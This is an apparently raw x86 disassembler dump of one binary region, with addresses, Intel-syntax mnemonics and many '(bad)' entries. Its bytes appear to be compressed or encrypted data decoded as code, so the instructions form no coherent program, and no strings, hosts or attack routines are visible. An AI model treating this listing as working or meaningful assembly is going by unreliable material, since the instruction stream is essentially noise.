  422f0c:	mov    BYTE PTR [esi-0x5f],al
  422f0f:	in     al,dx
  422f10:	les    esp,FWORD PTR [eax]
  422f12:	lock add ecx,DWORD PTR ds:0x435c9b49
  422f19:	or     al,0x8f
  422f1b:	les    esp,FWORD PTR [edx+0x40216634]
  422f21:	mul    DWORD PTR [edx+0x3ad5bec7]
  422f27:	sbb    BYTE PTR [eax+0x2f],bh
  422f2a:	inc    ebp
  422f2b:	push   cs
  422f2c:	cmc    
  422f2d:	mov    al,ds:0x9ff91039
  422f32:	aad    0xf2
  422f34:	aad    0x51
  422f36:	fidivr DWORD PTR [esi]
  422f38:	jmp    0x29cf:0xc779c0ec
  422f3f:	lss    eax,FWORD PTR [eax]
  422f42:	mov    esp,ecx
  422f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f45:	push   0x2f
  422f47:	scas   eax,DWORD PTR es:[edi]
  422f48:	ror    BYTE PTR [eax-0x71],0x4e
  422f4c:	adc    dl,BYTE PTR [edi]
  422f4e:	sub    eax,0x7dadb1c7
  422f53:	fld    TBYTE PTR [ebp+0x6d]
  422f56:	pop    ebx
  422f57:	adc    dl,BYTE PTR [esi]
  422f59:	enter  0xca22,0x68
  422f5d:	adc    DWORD PTR [edx+0x6a658b90],ecx
  422f63:	stos   DWORD PTR es:[edi],eax
  422f64:	vpunpckhwd xmm5,xmm0,XMMWORD PTR [esi-0xc]
  422f69:	push   0xa5c939c9
  422f6e:	test   DWORD PTR [esi+0x765b3ee6],ecx
  422f74:	push   ecx
  422f75:	into   
  422f76:	sbb    DWORD PTR [esi],eax
  422f78:	nop
  422f79:	nop
  422f7a:	repz call 0xd2668cd3
  422f80:	data16 aaa 
  422f82:	cdq    
  422f83:	xor    DWORD PTR [edx-0x20],esi
  422f86:	rcl    dh,0xc
  422f89:	pop    edi
  422f8a:	sahf   
  422f8b:	stos   BYTE PTR es:[edi],al
  422f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f8d:	imul   eax,DWORD PTR [esi-0x47],0x5c2e0132
  422f94:	lock inc esp
  422f96:	je     0x423010
  422f98:	xchg   ecx,eax
  422f99:	mov    edi,0x3110ddb1
  422f9e:	jns    0x423001
  422fa0:	dec    esp
  422fa1:	pop    ds
  422fa2:	aam    0x57
  422fa4:	in     al,0x88
  422fa6:	dec    eax
  422fa7:	sahf   
  422fa8:	mov    ebx,0xb7e1fdff
  422fad:	cmp    cl,bl
  422faf:	int3   
  422fb0:	push   0xe0f060e7
  422fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fb6:	(bad)  
  422fb7:	xchg   ebp,eax
  422fb8:	push   ecx
  422fb9:	pop    esi
  422fba:	pop    edx
  422fbb:	fwait
  422fbc:	stc    
  422fbd:	xchg   ebx,eax
  422fbe:	or     edx,ebx
  422fc0:	sbb    eax,0x8ad746a
  422fc5:	inc    edi
  422fc6:	popa   
  422fc7:	mov    esp,0x48e416d1
  422fcc:	sbb    esi,DWORD PTR [eax+0x34]
  422fcf:	lahf   
  422fd0:	shl    DWORD PTR [ebx],0x34
  422fd3:	jb     0x422f9a
  422fd5:	push   ss
  422fd6:	or     edx,edx
  422fd8:	push   es
  422fd9:	je     0x422f95
  422fdb:	cs aaa 
  422fdd:	cli    
  422fde:	sub    DWORD PTR [esi-0x7f],ebp
  422fe1:	push   es
  422fe2:	mov    WORD PTR [ebx+ebx*8-0x2a1e4a36],?
  422fe9:	inc    esi
  422fea:	xchg   ebx,eax
  422feb:	in     eax,dx
  422fec:	fidivr WORD PTR [ebp+0xf64f73]
  422ff2:	or     DWORD PTR [ebx+eax*2+0x63],esi
  422ff6:	aam    0xe4
  422ff8:	jae    0x422ff3
  422ffa:	mov    ecx,0xcc5dfa0f
  422fff:	ret    
  423000:	arpl   cx,bp
  423002:	or     bl,al
  423004:	scas   eax,DWORD PTR es:[edi]
  423005:	repz mov ecx,0x3b7f1e90
  42300b:	sbb    DWORD PTR [edi],edx
  42300d:	push   ebp
  42300e:	scas   al,BYTE PTR es:[edi]
  42300f:	loop   0x423011
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [edx+edi*2+0x60b464b2],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	pop    ecx
  42308d:	int3   
  42308e:	addr16 into 
  423090:	test   BYTE PTR [ebx-0x40b0b164],0xbb
  423097:	int3   
  423098:	xor    edi,DWORD PTR [ebp-0x69]
  42309b:	push   cs
  42309c:	push   0xca0ea18f
  4230a1:	push   cs
  4230a2:	push   esi
  4230a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230a4:	sub    eax,0xc955e269
  4230a9:	mov    bh,BYTE PTR [edi+0x64]
  4230ac:	push   ebp
  4230ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ae:	fild   DWORD PTR [ebx]
  4230b0:	pop    ebx
  4230b1:	int    0xfd
  4230b3:	call   0x96a2b96c
  4230b8:	sub    eax,0x42a575aa
  4230bd:	(bad)  
  4230be:	sbb    eax,0xd2694495
  4230c3:	pop    eax
  4230c4:	sbb    eax,DWORD PTR [edx-0x3a]
  4230c7:	sahf   
  4230c8:	mov    ds:0xbc09dc09,eax
  4230cd:	push   ss
  4230ce:	fild   QWORD PTR [ecx+0x56]
  4230d1:	jl     0x423078
  4230d3:	jmp    0x423101
  4230d5:	pop    ss
  4230d6:	push   ds
  4230d7:	out    0x23,eax
  4230d9:	pop    esi
  4230da:	push   ecx
  4230db:	into   
  4230dc:	jbe    0x4230e3
  4230de:	jmp    0xb2d40ca
  4230e3:	push   es
  4230e4:	push   ebx
  4230e5:	adc    cl,BYTE PTR [edi]
  4230e7:	cmp    al,0xdc
  4230e9:	jp     0x423109
  4230eb:	aam    0x54
  4230ed:	cmp    BYTE PTR [ebp+0x2c],ah
  4230f0:	xchg   eax,edi
  4230f2:	xor    BYTE PTR [edx-0x6fa68c0f],0x1
  4230f9:	xchg   esp,eax
  4230fa:	mov    ds:0x1c318118,eax
  4230ff:	sar    BYTE PTR [ebp+0x1171e540],0x46
  423106:	jo     0x4230c4
  423108:	stc    
  423109:	sahf   
  42310a:	pop    edx
  42310b:	push   eax
  42310c:	adc    DWORD PTR [esi+0x40],ebx
  42310f:	clc    
  423110:	ins    DWORD PTR es:[edi],dx
  423111:	push   esp
  423112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423113:	cmp    eax,0x7695df7e
  423118:	adc    eax,0xcdcd3697
  42311d:	sbb    DWORD PTR [edi],edx
  42311f:	sahf   
  423120:	mov    ah,0xaf
  423122:	and    al,BYTE PTR [edx-0x5889e872]
  423128:	sar    BYTE PTR [esi-0x6b],0xc1
  42312c:	stc    
  42312d:	and    eax,0x4ef13548
  423132:	pushf  
  423133:	sbb    bh,ah
  423135:	cdq    
  423136:	jmp    0xd6d3:0xdf32c9bd
  42313d:	push   ebp
  42313e:	or     eax,0x8696746e
  423143:	mov    edx,0xaee78bb7
  423148:	in     al,0x8b
  42314a:	mov    ah,cl
  42314c:	inc    edi
  42314d:	pop    edi
  42314e:	and    al,0x5
  423150:	bound  esp,QWORD PTR [edi]
  423152:	(bad)  
  423153:	pop    ebx
  423154:	scas   al,BYTE PTR es:[edi]
  423155:	sub    ecx,ebp
  423157:	(bad)  [esi+eiz*1]
  42315a:	jecxz  0x423136
  42315c:	mov    DWORD PTR [ecx+0x37200a1d],esp
  423162:	inc    esp
  423163:	(bad)  
  423165:	lock retfw 0x1f58
  42316a:	sbb    al,0x68
  42316c:	lds    eax,FWORD PTR [ecx-0x41]
  42316f:	lods   eax,DWORD PTR ds:[esi]
  423170:	inc    edx
  423171:	xchg   edi,eax
  423172:	jle    0x4231b1
  423174:	push   ebx
  423175:	call   0x6e98:0x5131199c
  42317c:	or     DWORD PTR [edi+0x66],edx
  42317f:	add    BYTE PTR [ebx-0x6],dl
  423182:	mov    al,ds:0x522b506e
  423187:	xor    ch,dh
  423189:	sbb    dl,BYTE PTR [edi-0x2614c8a9]
  42318f:	add    BYTE PTR gs:[eax],al
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x61a65ad1],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	push   ecx
  42320d:	stos   DWORD PTR es:[edi],eax
  42320e:	sti    
  42320f:	lock hlt 
  423211:	mov    edi,0x6d057c1
  423216:	mov    esi,0x61cc9016
  42321b:	aas    
  42321c:	das    
  42321d:	(bad)
  423220:	mov    ebp,0xd49cccd
  423225:	or     esi,DWORD PTR cs:[esi-0x539ba41]
  42322c:	cmp    al,0xa9
  42322e:	push   eax
  42322f:	jl     0x4232aa
  423231:	mov    dl,0x86
  423233:	push   0x22
  423235:	dec    eax
  423236:	xor    ecx,DWORD PTR [edx+esi*1]
  423239:	cmp    BYTE PTR [bx],al
  42323c:	pushf  
  42323d:	addr16 push ss
  42323f:	fisubr DWORD PTR [ebx]
  423241:	scas   eax,DWORD PTR es:[edi]
  423242:	stos   BYTE PTR es:[edi],al
  423243:	sbb    edx,edi
  423245:	enter  0xe3a9,0x7f
  423249:	shl    DWORD PTR [edx-0x14d79a13],0xe
  423250:	js     0x423264
  423252:	sub    eax,0x38f9a917
  423257:	daa    
  423258:	mov    ds:0x63597f14,eax
  42325d:	xor    al,0xea
  42325f:	ficom  DWORD PTR [ecx+0x67]
  423262:	cs ficomp WORD PTR es:[ebp+0x5969f6c0]
  42326a:	inc    edi
  42326b:	add    BYTE PTR [esi+ecx*2-0x28],ch
  42326f:	push   ebp
  423270:	loope  0x423289
  423272:	pop    ss
  423273:	out    dx,al
  423274:	push   edx
  423275:	mov    esi,0x6d7eda3e
  42327a:	mov    al,ds:0x947b39b1
  42327f:	shl    DWORD PTR [esp+ebx*8+0x42],0xfa
  423284:	(bad)  
  423285:	(bad)  
  423287:	(bad)  
  423288:	cli    
  423289:	stc    
  42328a:	and    eax,ebp
  42328c:	xor    eax,0xcead1da
  423291:	pusha  
  423292:	aas    
  423293:	inc    edi
  423294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423295:	aas    
  423296:	push   cs
  423297:	mov    ds:0x73633eaf,al
  42329c:	mov    bh,0xff
  42329e:	std    
  42329f:	jne    0x423279
  4232a1:	mov    ebp,esi
  4232a3:	out    0x3e,eax
  4232a5:	je     0x423289
  4232a7:	(bad)  
  4232a8:	shl    dl,1
  4232aa:	neg    esi
  4232ac:	retf   0x9c44
  4232af:	mov    ds:0x43e6c287,al
  4232b4:	xchg   ecx,eax
  4232b5:	xor    eax,0x9941b8fd
  4232ba:	fsubr  DWORD PTR [edx-0x61]
  4232bd:	push   edi
  4232be:	inc    ebp
  4232bf:	ss nop
  4232c1:	mov    WORD PTR [ebp+0x7d],?
  4232c4:	cmp    eax,0x428dfc2f
  4232ca:	fbstp  TBYTE PTR [ecx+0xc]
  4232cd:	adc    ch,bl
  4232cf:	into   
  4232d0:	ins    BYTE PTR es:[edi],dx
  4232d1:	pop    ds
  4232d2:	jg     0x423291
  4232d4:	adc    BYTE PTR [edx],0x25
  4232d7:	lock mov edi,0x17e122ad
  4232dd:	pop    es
  4232de:	mov    WORD PTR [ebx],fs
  4232e0:	cmp    eax,0xc2b3a12a
  4232e5:	add    ecx,DWORD PTR [eax-0x53]
  4232e8:	mov    al,ds:0xd17209d0
  4232ed:	jecxz  0x42334b
  4232ef:	add    ch,BYTE PTR [edi-0x5e]
  4232f2:	(bad)  
  4232f3:	mov    eax,ds:0xbaa2c5a1
  4232f8:	sub    ebp,ebx
  4232fa:	jno    0x42334b
  4232fc:	or     ch,BYTE PTR [esp+edi*2-0x3eb24bda]
  423303:	lds    esp,FWORD PTR [ebx+ecx*2-0x4ed545a6]
  42330a:	add    BYTE PTR [edi+0x558b77b],dh
	...
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xf3a40f44
  423382:	lods   al,BYTE PTR ds:[esi]
  423383:	xchg   DWORD PTR [eax+0x77],ebp
  423386:	add    DWORD PTR [eax],eax
  423388:	add    al,0x1
  42338a:	add    BYTE PTR [eax],al
  42338c:	pusha  
  42338d:	adc    eax,edi
  42338f:	or     al,0x9f
  423391:	fisttp WORD PTR [edi-0x9a35248]
  423397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423398:	push   cs
  423399:	iret   
  42339a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42339b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42339c:	cmp    al,0x2f
  42339e:	out    dx,eax
  42339f:	push   0x82298e48
  4233a4:	add    DWORD PTR ss:[edi+0x2],esi
  4233a8:	ror    BYTE PTR [esi+0x13fd612e],cl
  4233ae:	push   0xffffff9a
  4233b0:	pop    cx
  4233b2:	or     eax,0xf1db5765
  4233b7:	pop    edi
  4233b8:	cmp    dl,ah
  4233ba:	xor    DWORD PTR [esi],edx
  4233bc:	pop    ss
  4233bd:	pop    ebp
  4233be:	mov    cl,BYTE PTR [ebx+0x75]
  4233c1:	lea    esp,[esi]
  4233c3:	es int3 
  4233c5:	add    ch,BYTE PTR [esi]
  4233c7:	mov    eax,ds:0x70c25e65
  4233cc:	leave  
  4233cd:	outs   dx,DWORD PTR ds:[esi]
  4233ce:	test   bl,cl
  4233d0:	xchg   ebx,eax
  4233d1:	push   edx
  4233d2:	or     al,0x99
  4233d4:	and    dh,BYTE PTR [eax+0x26dde2c5]
  4233da:	mov    cs,WORD PTR [ebp-0x2ca57bf5]
  4233e0:	mov    ecx,DWORD PTR [edi]
  4233e2:	sub    edx,ebx
  4233e4:	inc    edi
  4233e5:	test   eax,0x7f6b8fc4
  4233ea:	and    eax,0xec4c2eca
  4233ef:	xor    DWORD PTR [edi],ebx
  4233f1:	dec    edx
  4233f2:	adc    edi,DWORD PTR ss:[edi+ebp*4+0x5e1fd00c]
  4233fa:	add    BYTE PTR [ebp-0x7e128596],ah
  423400:	push   esp
  423401:	mov    ds:0x1ed46a5b,al
  423406:	cli    
  423407:	mov    WORD PTR [esi+0x492eb829],?
  42340d:	cmp    BYTE PTR [ebx+0x74],ch
  423410:	jl     0x4233e1
  423412:	lock cmp edx,ebx
  423415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423416:	adc    al,bl
  423418:	adc    dh,cl
  42341a:	cdq    
  42341b:	or     esi,DWORD PTR [esi]
  42341d:	adc    bh,ah
  42341f:	ja     0x4233ad
  423421:	sbb    al,0xbe
  423423:	scas   eax,DWORD PTR es:[edi]
  423424:	adc    al,0x1c
  423426:	cs stos BYTE PTR es:[edi],al
  423428:	pop    esp
  423429:	nop
  42342a:	rcr    DWORD PTR [edx+0x32],cl
  42342d:	mov    al,ds:0x83206e17
  423432:	gs mov ecx,0x287ab454
  423438:	lock mov ebx,0x48eecee6
  42343e:	mov    bh,cl
  423440:	icebp  
  423441:	dec    esi
  423442:	nop
  423443:	scas   al,BYTE PTR es:[edi]
  423444:	sti    
  423445:	or     DWORD PTR [esi],ebx
  423447:	arpl   WORD PTR [ebx],cx
  423449:	push   es
  42344a:	mov    BYTE PTR [edx+0x72],dl
  42344d:	inc    esp
  42344e:	pop    ebx
  42344f:	fst    st(7)
  423451:	cdq    
  423452:	es mov ebp,edx
  423455:	(bad)  
  423456:	fst    QWORD PTR [esi+0x54d184c]
  42345c:	xchg   esp,eax
  42345d:	mov    ah,0xd9
  42345f:	mov    bh,0x9c
  423461:	icebp  
  423462:	ja     0x42343a
  423464:	xchg   ebx,eax
  423465:	push   0x49
  423467:	jnp    0x4234e1
  423469:	in     al,0xa0
  42346b:	gs call 0x4e303433
  423471:	push   ebp
  423472:	mov    eax,edi
  423474:	jne    0x4234bd
  423476:	dec    edx
  423477:	fdivr  DWORD PTR [edi+0x40f034f3]
  42347d:	cdq    
  42347e:	jecxz  0x423488
  423480:	adc    DWORD PTR [eax-0x7b],0x9d4063a3
  423487:	mov    eax,DWORD PTR [esi+ebp*1+0x4f4746c5]
  42348e:	outs   dx,DWORD PTR ss:[esi]
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	(bad)  
  423502:	or     eax,0x1786cfe
  423507:	add    BYTE PTR [ecx+eax*1],al
  42350a:	add    BYTE PTR [eax],al
  42350c:	fild   DWORD PTR ds:0xe0a2bf71
  423512:	fisub  WORD PTR [esi-0x1d]
  423515:	fucomip st,st(2)
  423517:	lods   eax,DWORD PTR ds:[esi]
  423518:	das    
  423519:	les    ebp,FWORD PTR [edx+0x5e]
  42351c:	mov    eax,0x2ceda57a
  423521:	(bad)  [edi-0x7bd71fac]
  423527:	push   ebx
  423528:	inc    ecx
  423529:	aaa    
  42352a:	sub    BYTE PTR [edx+0x20],ch
  42352d:	xor    eax,0x2625d228
  423532:	xor    BYTE PTR [edi],bl
  423534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423535:	test   BYTE PTR [esi+eax*4-0x3892ae3e],0xf8
  42353d:	inc    edx
  42353e:	xor    DWORD PTR [edx],eax
  423540:	push   es
  423541:	lock mov cl,0x3a
  423544:	js     0x423554
  423546:	inc    esi
  423547:	sbb    al,0xdf
  423549:	push   es
  42354a:	fwait
  42354b:	cli    
  42354c:	mov    cl,0x71
  42354e:	inc    ebp
  42354f:	xchg   esp,eax
  423550:	aaa    
  423551:	stc    
  423552:	xchg   DWORD PTR [edx-0x33d989d5],ecx
  423558:	out    dx,eax
  423559:	inc    esi
  42355a:	aaa    
  42355b:	lods   eax,DWORD PTR ds:[esi]
  42355c:	sar    BYTE PTR [edx+0x4fb3d84b],cl
  423562:	lds    ebp,FWORD PTR [ebp-0x3c]
  423565:	mov    eax,ds:0xc221f46a
  42356a:	jno    0x4235e5
  42356c:	jno    0x423514
  42356e:	stos   BYTE PTR es:[edi],al
  42356f:	dec    esp
  423570:	ret    
  423571:	xchg   ebp,eax
  423572:	jle    0x4235e5
  423574:	test   DWORD PTR ds:0x315d7f70,ebp
  42357a:	mov    esp,0xaa881ecd
  42357f:	cmp    ecx,esi
  423581:	pop    eax
  423582:	jge    0x423532
  423584:	lods   al,BYTE PTR ds:[esi]
  423585:	stos   BYTE PTR es:[edi],al
  423586:	shl    DWORD PTR [edi+ebx*1-0x2],cl
  42358a:	push   ds
  42358b:	cwde   
  42358c:	inc    esp
  42358d:	mov    ds:0xead6fc48,al
  423592:	jmp    DWORD PTR [ebx+0x4f]
  423595:	ret    
  423596:	push   edi
  423597:	xchg   ebx,eax
  423598:	outs   dx,BYTE PTR ds:[esi]
  423599:	adc    DWORD PTR [ebx-0x31297b85],eax
  42359f:	in     eax,0xf6
  4235a1:	jl     0x42355d
  4235a3:	cs dec ebp
  4235a5:	fstp   DWORD PTR [esp+eiz*4+0x49]
  4235a9:	add    al,0xae
  4235ab:	jmp    0xcfa8:0x121484ed
  4235b2:	mov    BYTE PTR [edx],bh
  4235b4:	xchg   ecx,eax
  4235b5:	mov    al,ds:0xfd416c1a
  4235ba:	adc    eax,0x63182ea2
  4235bf:	les    eax,FWORD PTR [esi+0x55b73b79]
  4235c5:	xchg   ecx,eax
  4235c7:	(bad)  [bp+si+0x51]
  4235cb:	arpl   bx,bx
  4235cd:	mov    esi,0xacb432a9
  4235d2:	pop    ebp
  4235d3:	iret   
  4235d4:	sar    ch,0x49
  4235d7:	sbb    BYTE PTR [esi+0x5ab7af50],bh
  4235dd:	jns    0x423565
  4235df:	leave  
  4235e0:	or     eax,DWORD PTR [esi+ebx*2]
  4235e3:	xor    al,0x2b
  4235e5:	scas   eax,DWORD PTR es:[edi]
  4235e6:	mov    ds:0xf69c7052,eax
  4235eb:	in     al,dx
  4235ec:	scas   eax,DWORD PTR es:[edi]
  4235ed:	push   ds
  4235ee:	imul   edi,DWORD PTR [ebp-0x40],0x5ea7a114
  4235f5:	dec    eax
  4235f6:	mov    WORD PTR [edx-0x4f],?
  4235f9:	jmp    0x4235f0
  4235fb:	xor    eax,ecx
  4235fd:	xchg   edi,eax
  4235fe:	lods   eax,DWORD PTR ds:[esi]
  4235ff:	out    0x33,al
  423601:	mov    WORD PTR [ebp-0x33a75205],?
  423607:	ins    DWORD PTR es:[edi],dx
  423608:	repz jmp 0x423611
  42360b:	rol    BYTE PTR [ecx+0x72],cl
  42360e:	sbb    ebx,edx
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	lds    ebp,FWORD PTR [edi]
  423682:	in     eax,0x2c
  423684:	jo     0x4236ff
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	(bad)  
  42368d:	pushf  
  42368e:	and    dl,BYTE PTR [ecx-0x3540b6a4]
  423694:	or     dl,BYTE PTR [ebx+0x45135de8]
  42369a:	push   es
  42369b:	mov    ds:0x843004a7,eax
  4236a0:	cdq    
  4236a1:	outs   dx,BYTE PTR ds:[esi]
  4236a2:	push   ebp
  4236a3:	adc    DWORD PTR [eax+0x49],ecx
  4236a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236a7:	add    dl,BYTE PTR [edi*8+0x41e2dae5]
  4236ae:	out    0x24,al
  4236b0:	lods   al,BYTE PTR ds:[esi]
  4236b1:	jle    0x42371f
  4236b3:	retf   
  4236b4:	loopne 0x4236a8
  4236b6:	mov    ?,WORD PTR [edi-0x5c]
  4236b9:	cmc    
  4236ba:	cs loop 0x4236ea
  4236bd:	add    DWORD PTR [ecx-0x9],ebp
  4236c0:	shl    BYTE PTR [esi-0xa22f11f],cl
  4236c6:	das    
  4236c7:	lock addr16 mov edx,0xe7bf8dc7
  4236ce:	js     0x423721
  4236d0:	out    dx,al
  4236d1:	call   0xf5e8:0x38cd7eea
  4236d8:	dec    eax
  4236d9:	ret    
  4236da:	outs   dx,BYTE PTR ds:[esi]
  4236db:	adc    ah,BYTE PTR [edx]
  4236dd:	hlt    
  4236de:	xchg   esi,eax
  4236df:	(bad)  
  4236e0:	std    
  4236e1:	data16 mov ch,BYTE PTR ds:0x3c6b3dd6
  4236e8:	adc    eax,0xf0072979
  4236ed:	xchg   edx,eax
  4236ee:	into   
  4236ef:	push   edx
  4236f0:	adc    BYTE PTR [ecx+0x79c17a84],dh
  4236f6:	js     0x4236a2
  4236f8:	test   al,0x85
  4236fa:	ret    0xe5c5
  4236fd:	or     al,0x1b
  4236ff:	lds    edx,FWORD PTR [ecx+0x4851fec5]
  423705:	cs in  eax,dx
  423707:	fistp  DWORD PTR [edi]
  423709:	sub    DWORD PTR [ebx+0x24bdb7f6],0x1d704d7f
  423713:	test   eax,0x24b5f727
  423718:	mul    DWORD PTR fs:[esi]
  42371b:	mov    edx,0x17152801
  423720:	and    edx,ebp
  423722:	stc    
  423723:	popf   
  423724:	jge    0x4236a6
  423726:	pop    eax
  423727:	scas   eax,DWORD PTR es:[edi]
  423728:	sub    eax,0xb6f95309
  42372d:	jl     0x423766
  42372f:	stos   DWORD PTR es:[edi],eax
  423730:	mov    esi,0x968e6d82
  423735:	fwait
  423736:	add    DWORD PTR [eax],edi
  423738:	(bad)  
  423739:	mov    ebp,0x773d1b8d
  42373e:	xor    al,0x98
  423740:	add    dh,BYTE PTR [edx+0x24]
  423743:	pushf  
  423744:	cdq    
  423745:	fstp   TBYTE PTR ds:0x67e7e6b7
  42374b:	or     edx,DWORD PTR [edi]
  42374d:	sahf   
  42374e:	test   eax,0xfe588cba
  423753:	or     eax,DWORD PTR [esi]
  423755:	inc    ebp
  423756:	mov    edi,0x279e8ca0
  42375b:	enter  0x5759,0xc8
  42375f:	jmp    0xf274:0x4239214f
  423766:	sbb    al,0x79
  423768:	pop    eax
  423769:	lahf   
  42376a:	ficomp WORD PTR [ebp-0x5d]
  42376d:	push   ebx
  42376e:	mov    DWORD PTR [edx-0x18],0x4ecdab07
  423775:	dec    edx
  423776:	ret    0x1c97
  423779:	push   edx
  42377a:	mov    edi,0x75b3d30f
  42377f:	rcr    BYTE PTR [ecx],1
  423781:	add    ch,BYTE PTR [ecx+0x29413f8a]
  423787:	mov    eax,ds:0x9045be38
  42378c:	push   ebp
  42378d:	and    BYTE PTR [edi],al
  42378f:	daa    
	...
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xbf169f22
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	mov    eax,ds:0xba9278c8
  423811:	adc    DWORD PTR [ecx+0x1d2ad1b9],0xb799e781
  42381b:	mov    eax,0x22f65e0d
  423820:	jbe    0x42386d
  423822:	xor    dh,BYTE PTR [edi-0x3c]
  423825:	sar    ah,0xf7
  423828:	cwde   
  423829:	idiv   bl
  42382b:	ins    BYTE PTR es:[edi],dx
  42382c:	aad    0xba
  42382e:	int3   
  42382f:	push   esi
  423830:	(bad)  ss:[eax]
  423833:	xor    al,0xe4
  423835:	pop    edi
  423836:	stos   DWORD PTR es:[edi],eax
  423837:	leave  
  423838:	xor    BYTE PTR [eax],al
  42383a:	sbb    bh,0x70
  42383d:	adc    BYTE PTR [edx],ah
  42383f:	jb     0x42384e
  423841:	loop   0x423840
  423843:	xor    ebx,DWORD PTR [esi+0x2d049b21]
  423849:	in     eax,dx
  42384a:	outs   dx,DWORD PTR ds:[esi]
  42384b:	mov    dl,0x98
  42384d:	lahf   
  42384e:	dec    eax
  42384f:	(bad)  
  423850:	aaa    
  423851:	in     eax,0xbf
  423853:	(bad)  
  423854:	mov    esp,DWORD PTR ds:0xd02cc24
  42385a:	cmp    eax,DWORD PTR [ebx]
  42385c:	cwde   
  42385d:	lea    ebp,[ebx]
  42385f:	cs dec ebp
  423861:	js     0x4238b9
  423863:	mov    esp,ebp
  423865:	call   0xabd1:0xc69f97ad
  42386c:	das    
  42386d:	retf   0x9823
  423870:	lahf   
  423871:	cmp    eax,0x58087715
  423876:	shr    BYTE PTR [edi+0x2d],1
  423879:	ret    0x8113
  42387c:	mov    ds:0x98b46d71,eax
  423881:	or     al,BYTE PTR fs:[edx+eiz*8+0x17]
  423886:	mov    ds:0xa5b4da19,al
  42388b:	mov    ds:0x7e0fb30c,ax
  423891:	mov    eax,DWORD PTR [ecx+0x4f53daa5]
  423897:	test   al,0x1a
  423899:	scas   eax,DWORD PTR es:[edi]
  42389a:	bswap  ebp
  42389c:	xor    ah,ah
  42389e:	cli    
  42389f:	push   edx
  4238a0:	inc    eax
  4238a1:	sub    esp,DWORD PTR [ebx+0x15a4b305]
  4238a7:	dec    ebp
  4238a8:	into   
  4238a9:	sar    bl,cl
  4238ab:	jns    0x42391c
  4238ad:	push   ds
  4238ae:	mov    esi,0x48358ed5
  4238b3:	jno    0x423934
  4238b5:	lea    eax,[eax+0x7b9db530]
  4238bb:	pop    es
  4238bc:	lods   eax,DWORD PTR ds:[esi]
  4238bd:	fild   DWORD PTR [ebp-0x7772bc98]
  4238c3:	push   ebp
  4238c4:	enter  0xbb63,0x97
  4238c8:	imul   bl
  4238ca:	fldenv [edx+ebx*1+0x5a]
  4238ce:	popf   
  4238cf:	inc    esp
  4238d0:	dec    ebx
  4238d1:	aam    0x3d
  4238d3:	sahf   
  4238d4:	call   DWORD PTR [ebx+edx*8-0x60a6e0fc]
  4238db:	les    edi,FWORD PTR [bp+di+0xa]
  4238df:	jne    0x423876
  4238e1:	loopne 0x4238b3
  4238e3:	stos   DWORD PTR es:[edi],eax
  4238e4:	adc    al,0x62
  4238e6:	xchg   edx,eax
  4238e7:	neg    DWORD PTR [ebx]
  4238e9:	and    ah,al
  4238eb:	imul   ebx,DWORD PTR [ecx-0x75],0xffffffc0
  4238ef:	je     0x42390f
  4238f1:	test   al,0x2c
  4238f3:	imul   eax,DWORD PTR [ecx-0x3cf1d715],0xdae2ad4f
  4238fd:	repnz icebp 
  4238ff:	outs   dx,DWORD PTR ds:[esi]
  423900:	popf   
  423901:	clc    
  423902:	seto   BYTE PTR [ebp+0x291fe27a]
  423909:	fadd   QWORD PTR [ebx]
  42390b:	mov    bh,ah
  42390d:	neg    bh
  42390f:	fild   WORD PTR [eax]
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xc3be2bbd
  423982:	scas   eax,DWORD PTR es:[edi]
  423983:	icebp  
  423984:	js     0x423a01
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	push   ds
  42398d:	or     bh,BYTE PTR [edx+0x6c]
  423990:	mov    ah,0x61
  423992:	inc    ecx
  423993:	xor    edx,ecx
  423995:	inc    ebp
  423996:	mov    BYTE PTR [ebx+0x29],dh
  423999:	data16 loopne 0x423960
  42399c:	adc    DWORD PTR [eax],ecx
  42399e:	loope  0x42399d
  4239a0:	cwde   
  4239a1:	mov    ebx,gs
